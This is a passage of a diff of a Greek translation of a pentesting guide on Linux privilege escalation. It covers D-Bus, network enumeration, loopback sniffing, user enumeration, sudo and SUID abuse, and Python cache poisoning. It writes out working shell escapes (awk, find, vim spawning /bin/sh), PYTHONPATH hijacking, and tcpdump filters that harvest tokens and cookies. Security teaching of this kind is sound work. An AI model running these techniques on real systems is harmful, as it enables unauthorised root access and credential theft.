-Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή βρίσκεστε **μέσα στο group `docker`**, έχετε [**περισσότερους τρόπους για privilege escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Αν το [**docker API ακούει σε μια θύρα** μπορείτε επίσης να το παραβιάσετε](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο socket του docker επειδή **ανήκετε στην ομάδα `docker`**, υπάρχουν [**περισσότεροι τρόποι για κλιμάκωση προνομίων**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Αν το [**docker API ακούει σε μια θύρα**, μπορείτε επίσης να το παραβιάσετε](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
-Δείτε **περισσότερους τρόπους για να ξεφύγετε από containers ή να κάνετε abuse σε container runtimes για privilege escalation** στη διεύθυνση:
+Δείτε **περισσότερους τρόπους διαφυγής από containers ή κατάχρησης των container runtimes για κλιμάκωση προνομίων** εδώ:
 
 
 {{#ref}}
 ../../containers-namespaces/container-security/
 {{#endref}}
 
-## Containerd (ctr) privilege escalation
+## Κλιμάκωση προνομίων με το Containerd (ctr)
 
-Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να την εκμεταλλευτείτε για privilege escalation**:
+Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για κλιμάκωση προνομίων**:
 
 
 {{#ref}}
 ../../containers-namespaces/containerd-ctr-privilege-escalation.md
 {{#endref}}
 
-## **RunC** privilege escalation
+## Κλιμάκωση προνομίων με το **RunC**
 
-Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να την εκμεταλλευτείτε για privilege escalation**:
+Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για κλιμάκωση προνομίων**:
 
 
 {{#ref}}
@@ -813,24 +929,26 @@ curl --unix-socket /var/run/docker.sock \
 
 ## **D-Bus**
 
-Το D-Bus είναι ένα εξελιγμένο **σύστημα Inter-Process Communication (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να ανταλλάσσουν δεδομένα αποτελεσματικά. Σχεδιασμένο με γνώμονα τα σύγχρονα Linux systems, προσφέρει ένα ισχυρό framework για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.<sup>[[16]](#references)</sup>
+Το D-Bus είναι ένα εξελιγμένο **σύστημα επικοινωνίας μεταξύ διεργασιών (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να ανταλλάσσουν δεδομένα αποτελεσματικά. Σχεδιασμένο με γνώμονα τα σύγχρονα συστήματα Linux, προσφέρει ένα ισχυρό πλαίσιο για διαφορετικές μορφές επικοινωνίας μεταξύ εφαρμογών.<sup>[[16]](#references)</sup>
 
-Το σύστημα είναι ευέλικτο και υποστηρίζει βασικό IPC, το οποίο ενισχύει την ανταλλαγή δεδομένων μεταξύ processes, θυμίζοντας **βελτιωμένα UNIX domain sockets**. Επιπλέον, βοηθά στη μετάδοση events ή signals, διευκολύνοντας την ομαλή ενσωμάτωση μεταξύ των components του συστήματος. Για παράδειγμα, ένα signal από έναν Bluetooth daemon σχετικά με μια εισερχόμενη κλήση μπορεί να δώσει εντολή σε ένα music player να κάνει mute, βελτιώνοντας την εμπειρία του χρήστη. Επιπρόσθετα, το D-Bus υποστηρίζει ένα remote object system, απλοποιώντας τα service requests και τα method invocations μεταξύ εφαρμογών και βελτιστοποιώντας διαδικασίες που παραδοσιακά ήταν σύνθετες.
+Το σύστημα είναι ευέλικτο και υποστηρίζει βασικό IPC που διευκολύνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, θυμίζοντας **βελτιωμένα UNIX domain sockets**. Επιπλέον, βοηθά στη μετάδοση συμβάντων ή σημάτων, διευκολύνοντας την απρόσκοπτη ενσωμάτωση των στοιχείων του συστήματος. Για παράδειγμα, ένα σήμα από έναν daemon Bluetooth για εισερχόμενη κλήση μπορεί να κάνει ένα πρόγραμμα αναπαραγωγής μουσικής να σιγήσει, βελτιώνοντας την εμπειρία του χρήστη. Επιπρόσθετα, το D-Bus υποστηρίζει ένα σύστημα απομακρυσμένων αντικειμένων, απλοποιώντας τα αιτήματα υπηρεσιών και τις κλήσεις μεθόδων μεταξύ εφαρμογών, και απλοποιώντας διαδικασίες που παραδοσιακά ήταν περίπλοκες.
 
-Το D-Bus λειτουργεί με ένα **μοντέλο allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (method calls, signal emissions κ.λπ.) με βάση το σωρευτικό αποτέλεσμα των policy rules που ταιριάζουν. Αυτές οι policies καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν privilege escalation μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.
+Το D-Bus λειτουργεί με ένα **μοντέλο allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) με βάση τη σωρευτική επίδραση των κανόνων πολιτικής που αντιστοιχούν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν κλιμάκωση προνομίων μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.
 
-Ένα παράδειγμα μιας τέτοιας policy στο `/etc/dbus-1/system.d/wpa_supplicant.conf` παρέχεται παρακάτω και περιγράφει τα δικαιώματα του root user να κατέχει, να στέλνει και να λαμβάνει messages από το `fi.w1.wpa_supplicant1`.
+Παρακάτω δίνεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, η οποία περιγράφει τα δικαιώματα του root user να κατέχει το `fi.w1.wpa_supplicant1`, να του στέλνει μηνύματα και να λαμβάνει μηνύματα από αυτό.
 
-Οι policies χωρίς καθορισμένο user ή group εφαρμόζονται καθολικά, ενώ οι policies στο πλαίσιο "default" εφαρμόζονται σε όλα όσα δεν καλύπτονται από άλλες συγκεκριμένες policies.
+Οι πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα ισχύουν καθολικά, ενώ οι πολιτικές του "default" context ισχύουν για όλα όσα δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
+
 ```xml
 <policy user="root">
-<allow own="fi.w1.wpa_supplicant1"/>
-<allow send_destination="fi.w1.wpa_supplicant1"/>
-<allow send_interface="fi.w1.wpa_supplicant1"/>
-<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
+    <allow own="fi.w1.wpa_supplicant1"/>
+    <allow send_destination="fi.w1.wpa_supplicant1"/>
+    <allow send_interface="fi.w1.wpa_supplicant1"/>
+    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
 </policy>
 ```
-**Μάθετε πώς να κάνετε enumerate και να εκμεταλλευτείτε μια επικοινωνία D-Bus εδώ:**
+
+**Μάθετε πώς να κάνετε enumeration και exploit σε μια επικοινωνία D-Bus εδώ:**
 
 
 {{#ref}}
@@ -839,9 +957,10 @@ curl --unix-socket /var/run/docker.sock \
 
 ## **Δίκτυο**
 
-Είναι πάντα ενδιαφέρον να κάνετε enumerate στο δίκτυο και να προσδιορίσετε τη θέση του machine.
+Είναι πάντα ενδιαφέρον να κάνετε enumeration στο δίκτυο και να προσδιορίσετε τη θέση του μηχανήματος.
 
 ### Γενικό enumeration
+
 ```bash
 #Hostname, hosts and DNS
 cat /etc/hostname /etc/hosts /etc/resolv.conf
@@ -898,9 +1017,13 @@ sudo conntrack -L 2>/dev/null | head -n 20
 #Files used by network services
 lsof -i
 ```
-### Γρήγορο triage του outbound filtering
 
-Αν το host μπορεί να εκτελεί commands αλλά τα callbacks αποτυγχάνουν, διαχωρίστε γρήγορα το DNS, το transport, το proxy και το route filtering:
+Αν μια ενεργή εγγραφή στο `/etc/inetd.conf` εκτελεί το GNU Inetutils `telnetd` ως root, ελέγξτε την έκδοση του ρυθμισμένου binary και τον τοπικό listener, ακόμη κι αν η θύρα είναι δεσμευμένη μόνο στο loopback. Το GNU Inetutils από την έκδοση 1.9.3 έως και την 2.7 είχε ένα [bypass ελέγχου ταυτότητας στο telnet](https://seclists.org/oss-sec/2026/q1/89), μέσω του οποίου η τιμή `USER` που παρείχε ο client περνούσε στο `login -f` (CVE-2026-24061). Μια διεργασία ή μια συμβολοσειρά έκδοσης αποτελεί ένδειξη· επιβεβαιώστε την κατάσταση των vendor patches και ποιος daemon εκτελείται πραγματικά προτού θεωρήσετε ότι είναι εκτεθειμένος. Ο [οδηγός Telnet](../../../network-services-pentesting/pentesting-telnet.md) περιέχει περισσότερες λεπτομέρειες.
+
+### Γρήγορος έλεγχος διαλογής για φιλτράρισμα εξερχόμενης κίνησης
+
+Αν ο host μπορεί να εκτελέσει εντολές, αλλά αποτυγχάνουν οι callbacks, ελέγξτε γρήγορα ξεχωριστά το φιλτράρισμα DNS, μεταφοράς, proxy και δρομολόγησης:
+
 ```bash
 # DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
 dig +time=2 +tries=1 @1.1.1.1 google.com A
@@ -916,9 +1039,11 @@ sudo traceroute -T -p 443 example.org 2>/dev/null || true
 env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
 curl --socks5-hostname <ip>:1080 https://ifconfig.me
 ```
+
 ### Ανοιχτές θύρες
 
-Να ελέγχετε πάντα τις network services που εκτελούνται στο μηχάνημα και με τις οποίες δεν μπορούσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτό:
+Ελέγχετε πάντα τις υπηρεσίες δικτύου που εκτελούνται στο μηχάνημα, με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτό:
+
 ```bash
 (netstat -punta || ss --ntpu)
 (netstat -punta || ss --ntpu) | grep "127.0"
@@ -926,15 +1051,17 @@ ss -tulpn
 #Quick view of local bind addresses (great for hidden/isolated interfaces)
 ss -tulpn | awk '{print $5}' | sort -u
 ```
-Ταξινόμησε τους listeners ανάλογα με το bind target:
 
-- `0.0.0.0` / `[::]`: εκτεθειμένα σε όλες τις τοπικές διεπαφές.
-- `127.0.0.1` / `::1`: μόνο τοπικά (καλοί υποψήφιοι για tunnel/forward).
+Ταξινομήστε τους listeners ανάλογα με τη διεύθυνση bind:
+
+- `0.0.0.0` / `[::]`: εκτίθενται σε όλες τις τοπικές διεπαφές.
+- `127.0.0.1` / `::1`: προσβάσιμοι μόνο τοπικά (καλοί υποψήφιοι για tunnel/forward).
 - Συγκεκριμένες εσωτερικές IP (π.χ. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): συνήθως προσβάσιμες μόνο από εσωτερικά segments.
 
-### Workflow triage για local-only services
+### Ροή εργασίας για την αρχική αξιολόγηση υπηρεσιών που είναι προσβάσιμες μόνο τοπικά
 
-Όταν κάνεις compromise σε έναν host, services που είναι bound στο `127.0.0.1` συχνά γίνονται για πρώτη φορά προσβάσιμα από το shell σου. Ένα γρήγορο local workflow είναι:
+Όταν αποκτήσετε πρόσβαση σε έναν host, οι υπηρεσίες που είναι δεσμευμένες στη `127.0.0.1` συχνά γίνονται για πρώτη φορά προσβάσιμες από το shell σας. Μια γρήγορη τοπική ροή εργασίας είναι:
+
 ```bash
 # 1) Find local listeners
 ss -tulnp
@@ -949,9 +1076,11 @@ nmap -Pn -sV -p <ports> 127.0.0.1
 nc 127.0.0.1 <port>
 printf 'HELP\r\n' | nc 127.0.0.1 <port>
 ```
-### Το LinPEAS ως network scanner (network-only mode)
 
-Εκτός από τους local PE checks, το linPEAS μπορεί να εκτελεστεί ως focused network scanner. Χρησιμοποιεί τα διαθέσιμα binaries στο `$PATH` (συνήθως `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά εργαλεία.
+### Το LinPEAS ως σαρωτής δικτύου (λειτουργία μόνο δικτύου)
+
+Εκτός από τους τοπικούς ελέγχους PE, το linPEAS μπορεί να εκτελεστεί ως εξειδικευμένος σαρωτής δικτύου. Χρησιμοποιεί τα διαθέσιμα binaries στο `$PATH` (συνήθως `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά εργαλεία.
+
 ```bash
 # Auto-discover subnets + hosts + quick ports
 ./linpeas.sh -t
@@ -968,15 +1097,19 @@ printf 'HELP\r\n' | nc 127.0.0.1 <port>
 # Scan one IP with selected ports
 ./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
 ```
-Αν εκτελέσετε το `-d`, το `-p` ή το `-i` χωρίς το `-t`, το linPEAS λειτουργεί ως pure network scanner (παρακάμπτοντας τους υπόλοιπους ελέγχους privilege-escalation).
+
+Αν περάσετε τα `-d`, `-p` ή `-i` χωρίς το `-t`, το linPEAS λειτουργεί ως καθαρός network scanner (παραλείποντας τους υπόλοιπους ελέγχους privilege escalation).
 
 ### Sniffing
 
-Ελέγξτε αν μπορείτε να κάνετε sniffing της κίνησης. Αν μπορείτε, ίσως να είστε σε θέση να συλλέξετε κάποια credentials.
+Ελέγξτε αν μπορείτε να κάνετε sniffing της κίνησης δικτύου. Αν μπορείτε, ίσως να καταφέρετε να υποκλέψετε credentials.
+
 ```
 timeout 1 tcpdump
 ```
+
 Γρήγοροι πρακτικοί έλεγχοι:
+
 ```bash
 #Can I capture without full sudo?
 which dumpcap && getcap "$(which dumpcap)"
@@ -985,22 +1118,28 @@ which dumpcap && getcap "$(which dumpcap)"
 tcpdump -D
 ip -br addr
 ```
-Το Loopback (`lo`) είναι ιδιαίτερα χρήσιμο στο post-exploitation, επειδή πολλές υπηρεσίες που είναι διαθέσιμες μόνο εσωτερικά εκθέτουν εκεί tokens/cookies/credentials:
+
+Το Loopback (`lo`) είναι ιδιαίτερα πολύτιμο στο post-exploitation, επειδή πολλές υπηρεσίες που είναι προσβάσιμες μόνο εσωτερικά εκθέτουν εκεί tokens/cookies/credentials:
+
 ```bash
 sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
-| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
+  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
 ```
-Κατέγραψε τώρα, ανέλυσε αργότερα:
+
+Καταγράψτε τώρα, αναλύστε αργότερα:
+
 ```bash
 sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
 tshark -r /tmp/capture.pcap -Y http.request \
--T fields -e frame.time -e ip.src -e http.host -e http.request.uri
+  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
 ```
+
 ## Χρήστες
 
 ### Generic Enumeration
 
-Ελέγξτε **ποιοι** είστε, ποια **δικαιώματα** έχετε, ποιοι **χρήστες** υπάρχουν στα **συστήματα**, ποιοι μπορούν να κάνουν **login** και ποιοι έχουν **root privileges:**
+Ελέγξτε **ποιος** είστε, ποια **προνόμια** έχετε, ποιοι **χρήστες** υπάρχουν στα συστήματα, ποιοι μπορούν να κάνουν **login** και ποιοι έχουν **προνόμια root:**
+
 ```bash
 #Info about me
 id || (whoami && groups) 2>/dev/null
@@ -1025,60 +1164,68 @@ for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | so
 #Current user PGP keys
 gpg --list-keys 2>/dev/null
 ```
-### Big UID
 
-Ορισμένες εκδόσεις Linux επηρεάζονταν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να κάνουν privilege escalation. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
+### Μεγάλο UID
+
+Ορισμένες εκδόσεις Linux επηρεάζονταν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να κλιμακώσουν τα προνόμιά τους. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
 **Exploit it** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**
 
-### Groups
+### Ομάδες
 
-Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας παραχωρήσει root privileges:
+Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει δικαιώματα root:
 
 
 {{#ref}}
 ../../user-information/interesting-groups-linux-pe/
 {{#endref}}
 
-### Clipboard
+### Πρόχειρο
 
-Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο clipboard (αν είναι δυνατό)
+Ελέγξτε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατό)
+
 ```bash
 if [ `which xclip 2>/dev/null` ]; then
-echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
-echo "Highlighted text: "`xclip -o 2>/dev/null`
-elif [ `which xsel 2>/dev/null` ]; then
-echo "Clipboard: "`xsel -ob 2>/dev/null`
-echo "Highlighted text: "`xsel -o 2>/dev/null`
-else echo "Not found xsel and xclip"
-fi
+    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
+    echo "Highlighted text: "`xclip -o 2>/dev/null`
+  elif [ `which xsel 2>/dev/null` ]; then
+    echo "Clipboard: "`xsel -ob 2>/dev/null`
+    echo "Highlighted text: "`xsel -o 2>/dev/null`
+  else echo "Not found xsel and xclip"
+  fi
 ```
+
 ### Πολιτική κωδικών πρόσβασης
+
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
-### Γνωστοί κωδικοί πρόσβασης
 
-Αν **γνωρίζετε οποιονδήποτε κωδικό πρόσβασης** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό πρόσβασης.
+### Known passwords
+
+Αν **γνωρίζετε κάποιον κωδικό πρόσβασης** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον.
 
 ### Su Brute
 
-Αν δεν σας πειράζει να δημιουργήσετε πολύ θόρυβο και τα binaries `su` και `timeout` υπάρχουν στον υπολογιστή, μπορείτε να δοκιμάσετε να κάνετε brute-force χρήστη χρησιμοποιώντας το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
-Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force χρηστών.
+Αν δεν σας πειράζει να δημιουργήσετε πολύ θόρυβο και υπάρχουν τα binaries `su` και `timeout` στον υπολογιστή, μπορείτε να δοκιμάσετε να κάνετε brute-force σε χρήστες χρησιμοποιώντας το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` δοκιμάζει επίσης να κάνει brute-force σε χρήστες.
 
-## Καταχρήσεις εγγράψιμου PATH
+## Κατάχρηση εγγράψιμων PATH
 
 ### $PATH
 
-Αν διαπιστώσετε ότι μπορείτε να **γράψετε μέσα σε κάποιον φάκελο του $PATH**, ενδέχεται να μπορείτε να κάνετε privilege escalation **δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά τον root) και η οποία **δεν φορτώνεται από φάκελο που βρίσκεται νωρίτερα** από τον εγγράψιμο φάκελό σας στο $PATH.
+Αν διαπιστώσετε ότι μπορείτε να **γράψετε σε κάποιον φάκελο του $PATH**, ίσως μπορέσετε να κλιμακώσετε τα προνόμιά σας **δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο**, με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά τον root) και η οποία **δεν φορτώνεται από φάκελο που βρίσκεται πριν από τον εγγράψιμο φάκελό σας στο $PATH**.
 
 ### SUDO και SUID
 
-Ενδέχεται να επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή ενδέχεται να έχει το suid bit. Ελέγξτε το χρησιμοποιώντας:
+Ίσως σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας το sudo ή αυτή μπορεί να έχει το bit suid. Ελέγξτε το με:
+
 ```bash
 sudo -l #Check commands you can execute with sudo
 find / -perm -4000 2>/dev/null #Find all SUID binaries
 ```
-Ορισμένες **μη αναμενόμενες εντολές σάς επιτρέπουν να διαβάζετε ή/και να γράφετε αρχεία ή ακόμη και να εκτελείτε μια εντολή**.<sup>[[8]](#references)</sup> Για παράδειγμα:
+
+Ορισμένες **απρόσμενες εντολές σάς επιτρέπουν να διαβάζετε ή/και να γράφετε αρχεία, ή ακόμα και να εκτελείτε μια εντολή**.<sup>[[8]](#references)</sup> Για παράδειγμα:
+
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find /etc -exec sh -i \;
@@ -1087,50 +1234,70 @@ sudo tar c a.tar -I ./runme.sh a
 ftp>!/bin/sh
 less>! <shell_comand>
 ```
+
 ### NOPASSWD
 
-Η ρύθμιση του Sudo ενδέχεται να επιτρέπει σε έναν χρήστη να εκτελεί ορισμένες εντολές με τα δικαιώματα ενός άλλου χρήστη, χωρίς να γνωρίζει τον κωδικό πρόσβασης.
+Η ρύθμιση του Sudo μπορεί να επιτρέπει σε έναν χρήστη να εκτελεί ορισμένες εντολές με τα δικαιώματα ενός άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
+
 ```
 $ sudo -l
 User demo may run the following commands on crashlab:
-(root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/vim
 ```
-Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`. Είναι πλέον εύκολο να αποκτήσει ένα shell, προσθέτοντας ένα κλειδί SSH στον κατάλογο του `root` ή καλώντας το `sh`.
+
+Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`. Τώρα είναι πανεύκολο να αποκτήσει shell προσθέτοντας ένα ssh key στον κατάλογο root ή καλώντας το `sh`.
+
 ```
 sudo vim -c '!sh'
 ```
+
+### Σύγκριση Bash χωρίς εισαγωγικά σε sudo script
+
+Στο Bash, η δεξιά πλευρά του `[[ "$protected" == $candidate ]]` είναι ένα pattern. Αν ένα sudo script με δυνατότητα εκτέλεσης ως root συμπληρώνει το `candidate` από αρχείο που ελέγχει ο caller, μια τιμή όπως `prefix*` μπορεί να ταιριάξει με την αρχή μιας προστατευμένης συμβολοσειράς. Διαφορετικές διαδρομές επιτυχίας και σφάλματος ενδέχεται τότε να αποκαλύψουν ένα prefix oracle. Βάλτε τη δεξιά πλευρά σε εισαγωγικά (`[[ "$protected" == "$candidate" ]]`) όταν επιδιώκεται κυριολεκτική ισότητα. Ελέγξτε τα πραγματικά ορίσματα του sudo, την προέλευση της εισόδου και τη συμπεριφορά των παρατηρήσιμων κλάδων πριν θεωρήσετε ότι μια σύγκριση χωρίς εισαγωγικά είναι εκμεταλλεύσιμη. Το [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) ορίζει αυτή τη συμπεριφορά των pattern.
+
+### Αρχεία project PrusaSlicer μέσω sudo
+
+Μια απεριόριστη παραχώρηση sudo με δυνατότητα εκτέλεσης ως root για το `prusaslicer` ή το `prusa-slicer` χρήζει ελέγχου, αν ο caller μπορεί να επιλέξει το project `.3mf` που θα γίνει slice. Ένα project μπορεί να περιέχει script post-processing που εκτελείται κατά την εξαγωγή G-code· κατάλληλα διαμορφωμένα projects θα μπορούσαν να εκτελέσουν εντολές μέσω του PrusaSlicer έως και την έκδοση 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Επιβεβαιώστε τον ενεργό κανόνα sudo, την έκδοση του binary και τα vendor patches, την προέλευση του project και αν εκτελείται η σχετική διαδρομή εξαγωγής, πριν καταλήξετε ότι είναι προσβάσιμη η γραμμή ορίου προνομίων. Ένα σταθερό όρισμα project ή μια ενεργή πολιτική `NOEXEC` μπορεί να αλλάξει το αποτέλεσμα. Το να διαπιστώσετε απλώς ότι είναι εγκατεστημένο το slicer δεν αποδεικνύει ότι υπάρχει διαδρομή κλιμάκωσης προνομίων.
+
 ### SETENV
 
-Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιου στοιχείου:
+Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιου προγράμματος:
+
 ```bash
 $ sudo -l
 User waldo may run the following commands on admirer:
-(ALL) SETENV: /opt/scripts/admin_tasks.sh
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
-Αυτό το παράδειγμα, **βασισμένο στο HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για τη φόρτωση μιας αυθαίρετης βιβλιοθήκης python κατά την εκτέλεση του script ως root:
+
+Αυτό το παράδειγμα, **βασισμένο στο μηχάνημα Admirer του HTB**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking**, επιτρέποντας τη φόρτωση μιας αυθαίρετης βιβλιοθήκης Python κατά την εκτέλεση του script ως root:
+
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
-### Poisoning writable `__pycache__` / `.pyc` σε imports της Python που επιτρέπονται μέσω sudo
 
-Αν ένα **Python script που επιτρέπεται μέσω sudo** κάνει import ενός module του οποίου ο κατάλογος του package περιέχει ένα **εγγράψιμο `__pycache__`**, ενδέχεται να μπορείτε να αντικαταστήσετε το cached `.pyc` και να επιτύχετε code execution ως ο privileged user στο επόμενο import.<sup>[[30]](#references)</sup>
+### Δηλητηρίαση εγγράψιμου `__pycache__` / `.pyc` σε Python imports που επιτρέπονται μέσω sudo
+
+Αν ένα **Python script που επιτρέπεται μέσω sudo** εισάγει ένα module του οποίου ο κατάλογος πακέτου περιέχει εγγράψιμο **`__pycache__`**, ίσως μπορέσετε να αντικαταστήσετε το cached `.pyc` και να εκτελέσετε κώδικα ως προνομιούχος χρήστης στην επόμενη εισαγωγή.<sup>[[30]](#references)</sup>
 
 - Γιατί λειτουργεί:
-- Η CPython αποθηκεύει bytecode caches στο `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
-- Ο interpreter επικυρώνει το **header** (magic + timestamp/hash metadata που συνδέονται με το source) και στη συνέχεια εκτελεί το marshaled code object που είναι αποθηκευμένο μετά από αυτό το header.
-- Αν μπορείτε να **διαγράψετε και να δημιουργήσετε ξανά** το cached file επειδή ο κατάλογος είναι εγγράψιμος, ένα root-owned αλλά μη εγγράψιμο `.pyc` μπορεί και πάλι να αντικατασταθεί.
-- Τυπική διαδρομή:
-- Το `sudo -l` εμφανίζει ένα Python script ή wrapper που μπορείτε να εκτελέσετε ως root.
-- Αυτό το script κάνει import ενός local module από `/opt/app/`, `/usr/local/lib/...` κ.λπ.
-- Ο κατάλογος `__pycache__` του imported module είναι εγγράψιμος από τον χρήστη σας ή από όλους.
+  - Το CPython αποθηκεύει τα bytecode caches στο `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
+  - Ο interpreter επικυρώνει την **κεφαλίδα** (magic + μεταδεδομένα timestamp/hash που συνδέονται με την πηγή) και έπειτα εκτελεί το marshaled code object που είναι αποθηκευμένο μετά από αυτήν.
+  - Αν μπορείτε να **διαγράψετε και να δημιουργήσετε ξανά** το cached αρχείο επειδή ο κατάλογος είναι εγγράψιμος, μπορείτε να αντικαταστήσετε ένα `.pyc` που ανήκει στον root αλλά δεν είναι εγγράψιμο.
+- Συνήθης διαδρομή:
+  - Το `sudo -l` εμφανίζει ένα Python script ή wrapper που μπορείτε να εκτελέσετε ως root.
+  - Αυτό το script εισάγει ένα τοπικό module από το `/opt/app/`, το `/usr/local/lib/...` κ.λπ.
+  - Ο κατάλογος `__pycache__` του εισαγόμενου module είναι εγγράψιμος από τον χρήστη σας ή από όλους.
 
 Γρήγορη απαρίθμηση:
+
 ```bash
 sudo -l
 find / -type d -name __pycache__ -writable 2>/dev/null
 find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
 ```
-Αν μπορείς να επιθεωρήσεις το προνομιούχο script, εντόπισε τα εισαγόμενα modules και τη διαδρομή cache τους:<sup>[[32]](#references)</sup>
+
+Αν μπορείς να επιθεωρήσεις το προνομιούχο script, εντόπισε τα εισαγόμενα modules και τη διαδρομή της cache:<sup>[[32]](#references)</sup>
+
 ```bash
 grep -R "^import \\|^from " /opt/target/ 2>/dev/null
 python3 - <<'PY'
@@ -1140,20 +1307,22 @@ print(spec.origin)
 print(spec.cached)
 PY
 ```
-Διαδικασία κατάχρησης:
 
